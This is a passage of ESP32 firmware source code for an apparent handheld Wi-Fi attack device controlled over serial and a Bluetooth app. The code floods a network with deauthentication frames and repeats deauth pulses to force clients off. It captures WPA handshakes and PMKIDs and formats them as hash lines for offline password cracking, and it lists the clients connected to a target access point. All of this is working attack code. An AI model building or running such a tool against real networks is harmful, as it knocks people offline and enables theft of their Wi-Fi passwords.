    memcpy(hs.anonce, ev.nonce, 32);
    return false;
  }

  if (ev.msgNum != 2) return false;
  if (!hs.active || !hs.hasM1) return false;
  if (!sameMac(hs.apMac, ev.apMac) || !sameMac(hs.staMac, ev.staMac)) return false;
  if (!sameReplay(hs.m1Replay, ev.replay)) return false; // M1 M2 share replay ctr

  memcpy(hs.m2Mic, ev.mic, 16);
  hs.m2EapolLen = ev.eapolLen;
  memcpy(hs.m2Eapol, ev.eapol, ev.eapolLen);
  if (hs.m2EapolLen >= 97) memset(hs.m2Eapol + 81, 0, 16); 

  char apHex[13], staHex[13];
  macToHex(ev.apMac, apHex);
  macToHex(ev.staMac, staHex);
  hashline = "[CAPTURE] hashline: WPA*02*";
  hashline += bytesHex(hs.m2Mic, 16);
  hashline += "*"; hashline += apHex;
  hashline += "*"; hashline += staHex;
  hashline += "*"; hashline += selectedEssidHexFor(ev.apMac);
  hashline += "*"; hashline += bytesHex(hs.anonce, 32);
  hashline += "*"; hashline += bytesHex(hs.m2Eapol, hs.m2EapolLen);
  hashline += "*00\n"; // message-pair 00 = matched M1+M2
  ev.completePair = true;
  return true;
}

void loop() {
  // --- serial CLI ---
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n' || c == '\r') { handleCommand(cmdBuf); cmdBuf = ""; bleFlush(); }
    else if (cmdBuf.length() < 96) cmdBuf += c;
  }

  // --- BLE CLI: commands arrive from the app via the queue, run in loop context ---
  // ok
  {
    char inLine[97];
    if (cmdQueue && xQueueReceive(cmdQueue, inLine, 0) == pdTRUE) {
      handleCommand(String(inLine));
      bleFlush();                    // send this command's output as one batch
    }
  }

  if (mode == MODE_DEAUTH && millis() - lastDeauthBurst >= 1) {
    lastDeauthBurst = millis();
    for (int i = 0; i < 8; i++) {
      esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, deauthPkt, sizeof(deauthPkt), false);
      if (r == ESP_OK) deauthSent++;
      else if (deauthSent == 0 && i == 0)
        outf("[deauth] tx err=0x%x (unlock ok? channel set?)\n", r);
    }
  }

  if (mode == MODE_CAPTURE && !captureGotIt && millis() - lastPulse >= PULSE_PERIOD) {
    lastPulse = millis();
    for (int i = 0; i < PULSE_FRAMES; i++)
      if (esp_wifi_80211_tx(WIFI_IF_STA, deauthPkt, sizeof(deauthPkt), false) == ESP_OK) deauthSent++;
    outf("[capture] deauth pulse (%lu total), listening %ds for handshake...\n",
                  (unsigned long)deauthSent, (int)(PULSE_PERIOD / 1000));
  }

  if (mode == MODE_SNIFF && selected < 0 && millis() - lastHop >= SNIFF_HOP_PERIOD) {
    lastHop = millis();
    sniffChannel++;
    if (sniffChannel > 13) sniffChannel = 1;
    esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
  }

  if (mode == MODE_STATIONS && millis() - staStart >= STATIONS_DURATION) {
    char apMacStr[18]; macToStr(aps[selected].bssid, apMacStr);
    int n; portENTER_CRITICAL(&staMux); n = staCount; portEXIT_CRITICAL(&staMux);
    for (int i = 0; i < n; i++) {
      Station st; portENTER_CRITICAL(&staMux); st = stations[i]; portEXIT_CRITICAL(&staMux);
      char cm[18]; macToStr(st.mac, cm);
      // [STA] <ap_bssid> <client_mac> <packets> <rssi>  (the app parses this line)
      outf("[STA] %s %s %lu %d\n", apMacStr, cm, (unsigned long)st.packets, (int)st.rssi);
    }
    outf("[STATIONS] done %d\n", n);
    radioIdle();
    screenDirty = true;
    bleFlush();
  }

  // --- draw ---
  // Establish the correct clean base before any partial capture/banner rendering.
  drawCurrentScreen();

  Capture ev;
  while (capQueue && xQueueReceive(capQueue, &ev, 0) == pdTRUE) {
    String handshakeHash;
    bool pairCaptured = false;
    if (!ev.hasPmkid) pairCaptured = updateHandshakeAndBuildHash(ev, handshakeHash);

    cap = ev;                    // display renders the latest parsed event/pair state
    char apm[18], stam[18];
    macToStr(cap.apMac, apm); macToStr(cap.staMac, stam);
    if (cap.hasPmkid) {
      char hx[33]; for (int i = 0; i < 16; i++) sprintf(hx + i*2, "%02X", cap.pmkid[i]);
      hx[32] = 0;
      outf("\n[CAPTURE] *** PMKID (WPA hash) ***\n");
      outf("[CAPTURE] AP=%s STA=%s\n", apm, stam);
      outf("[CAPTURE] PMKID=%s\n", hx);
      outstr(pmkidHashline(cap));
    } else {
      outf("[CAPTURE] EAPOL handshake frame M%d  AP=%s STA=%s\n",
                    cap.msgNum, apm, stam);
      if (pairCaptured) {
        outf("[CAPTURE] *** WPA HANDSHAKE (M1+M2) ***\n");
        outf("[CAPTURE] AP=%s STA=%s\n", apm, stam);
        outstr(handshakeHash);
      }
    }
    if (mode == MODE_CAPTURE && !captureGotIt && (cap.hasPmkid || pairCaptured)) {
      captureGotIt = true;
      outln("[capture] handshake captured -> deauth pulses stopped, still listening.");
    }
    
    if (!captureBannerShown || ((cap.hasPmkid || cap.completePair) && !captureBannerHasPmkid)) {
      drawCaptureBanner();
      captureBannerShown = true;
      if (cap.hasPmkid || cap.completePair) captureBannerHasPmkid = true;
    }
    bleFlush();                     // operation milestone -> push result to the app now
  }

  if (millis() - lastRefresh > 500) {
    lastRefresh = millis();
    if (mode == MODE_DEAUTH) {
      tft.fillRect(0, 80, 160, 12, C_BG);
      tft.setTextSize(1); tft.setTextColor(C_WARN);
      tft.setCursor(0, 80); tft.print("sent: "); tft.print(deauthSent);
    } else if (mode == MODE_SNIFF && !captureBannerShown) {
      tft.fillRect(0, 28, 160, 12, C_BG);
      tft.setTextSize(1); tft.setTextColor(C_TXT);
      tft.setCursor(0, 28); tft.print("EAPOL seen: "); tft.print(eapolCount);
    } else if (mode == MODE_CAPTURE && !captureBannerShown) {
      tft.fillRect(0, 48, 160, 22, C_BG);
      tft.setTextSize(1); tft.setTextColor(C_WARN);
      tft.setCursor(0, 48); tft.print("deauth: "); tft.print(deauthSent);
      tft.setTextColor(C_TXT);
      tft.setCursor(0, 58); tft.print("EAPOL: "); tft.print(eapolCount);
      tft.print(captureGotIt ? " [GOT IT]" : "");
    } else if (mode == MODE_STATIONS) {
      int n; portENTER_CRITICAL(&staMux); n = staCount; portEXIT_CRITICAL(&staMux);
      tft.fillRect(0, 40, 160, 12, C_BG);
      tft.setTextSize(1); tft.setTextColor(C_OK);
      tft.setCursor(0, 40); tft.print("clients: "); tft.print(n);
    }
  }
}
